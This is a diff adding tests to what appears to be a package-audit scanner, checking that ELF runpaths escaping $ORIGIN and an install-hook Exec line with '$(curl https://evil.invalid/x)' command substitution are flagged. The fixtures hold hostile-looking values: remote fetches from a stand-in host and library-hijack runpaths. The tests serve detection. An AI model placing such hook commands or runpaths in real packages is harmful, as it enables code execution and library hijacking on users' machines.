@@ -183,6 +183,15 @@ def test_a014_allows_origin_relative_runpath():
     assert "A014" not in _ids(manifest)
 
 
+def test_a014_rejects_traversal_out_of_origin():
+    for runpath in ("$ORIGIN/../../../../tmp",
+                    "$ORIGIN/../../../home",
+                    "/tmp/$ORIGIN"):
+        manifest = [{"path": "/usr/bin/app",
+                     "elf": {"runpath": [runpath]}}]
+        assert "A014" in _ids(manifest), runpath
+
+
 def test_a015_flags_a_packed_binary():
     manifest = [{"path": "/usr/bin/app", "elf": {"packed": True}}]
     assert "A015" in _ids(manifest)
@@ -230,6 +239,20 @@ def test_a012_ignores_a_comment():
     manifest = [{"path": "/etc/x.hook",
                  "content": "# curl https://evil.invalid/x\nOperation = Install\n"}]
     assert "A012" not in _ids(manifest)
+
+
+def test_a012_ignores_printed_instructions_about_fetch_or_paths():
+    content = ("[Trigger]\nOperation = Install\n"
+               "Exec = /usr/bin/echo 'do not curl this from /tmp'\n")
+    manifest = [{"path": "/etc/x.hook", "content": content}]
+    assert "A012" not in _ids(manifest)
+
+
+def test_a012_still_fires_on_printed_command_substitution():
+    content = ("[Trigger]\nOperation = Install\n"
+               "Exec = /usr/bin/echo \"$(curl https://evil.invalid/x)\"\n")
+    manifest = [{"path": "/etc/x.hook", "content": content}]
+    assert "A012" in _ids(manifest)
 
 
 def test_a013_ignores_a_comment():
